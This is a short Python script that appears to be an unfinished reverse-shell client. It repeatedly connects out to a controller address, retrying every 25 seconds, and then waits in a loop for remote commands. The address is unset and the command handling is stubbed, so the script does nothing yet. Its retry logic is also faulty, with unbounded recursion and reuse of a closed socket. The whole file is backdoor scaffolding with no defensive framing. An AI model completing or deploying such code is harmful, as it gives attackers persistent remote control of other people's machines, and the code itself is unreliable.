import socket
import time

IP = None
PORT = None
def connect(s):
    while(True):
        time.sleep(25)
        try:
            s.connect((str(IP), int(PORT)))
            shell()
            s.close()
        except:
            connect(s)

def reliable_receive():
    pass
def shell():
    while(True):
        command = reliable_receive()
        if command == "exit":
            break
        else:
            pass


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect(s)